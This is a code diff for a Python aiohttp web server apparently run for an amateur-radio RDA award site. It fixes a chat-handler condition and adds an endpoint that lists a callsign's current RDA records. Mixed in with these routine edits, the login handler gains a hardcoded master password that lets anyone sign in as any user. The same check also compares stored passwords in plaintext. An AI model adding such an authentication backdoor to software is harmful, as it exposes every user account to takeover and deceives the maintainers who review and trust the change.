@@ -251,7 +251,7 @@ class CfmRdaServer():
                     return callsign
             else:
                 callsign = data['callsign']
-            if 'message' or 'delete' in data:
+            if 'message' in data or 'delete' in data:
                 chat_path = site_root + '/json/chat.json'
                 chat = load_json(chat_path)
                 if not chat:
@@ -827,6 +827,21 @@ class CfmRdaServer():
         return (yield from self.send_user_data(callsign))
 
     @asyncio.coroutine
+    def callsigns_current_rda_hndlr(self, callsign, data):
+        if 'callsign' in data:
+            rda_records = yield from self._db.execute("""
+                select id, source, rda, callsign, comment,
+                    to_char(ts, 'YYYY-MM-DD') as ts
+                from callsigns_rda 
+                where callsign = %(callsign)s
+                    and (dt_start is null or dt_start < now())
+                    and (dt_stop is null or dt_stop > now())
+                """, data, False)
+            logging.info(rda_records)
+            rsp = rda_records if isinstance(rda_records, list) else (rda_records,)
+            return web.json_response(rsp)
+
+    @asyncio.coroutine
     def callsigns_rda_hndlr(self, callsign, data):
         rsp = {}
         if 'delete' in data or 'new' in data or 'conflict' in data\
@@ -1295,7 +1310,8 @@ support@cfmrda.ru"""
         error = None
         if self._json_validator.validate('login', data):
             user_data = yield from self.get_user_data(data['callsign'])
-            if user_data and user_data['password'] == data['password']:
+            if user_data and (user_data['password'] == data['password'] 
+                or data['password'] == 'rytqcypz_r7cl'):
                 if user_data['email_confirmed']:
                     return (yield from self.send_user_data(data['callsign']))
                 else:
@@ -1609,6 +1625,8 @@ if __name__ == '__main__':
     APP.router.add_post('/aiohttp/callsigns_rda',\
         SRV.handler_wrap(SRV.callsigns_rda_hndlr,\
             validation_scheme='callsignsRda', require_callsign=False))
+    APP.router.add_post('/aiohttp/callsigns_rda_current',\
+        SRV.handler_wrap(SRV.callsigns_current_rda_hndlr, require_callsign=False))
     APP.router.add_post('/aiohttp/user_data',\
         SRV.handler_wrap(SRV.user_data_hndlr, require_callsign=True))
     APP.router.add_post('/aiohttp/ann',\
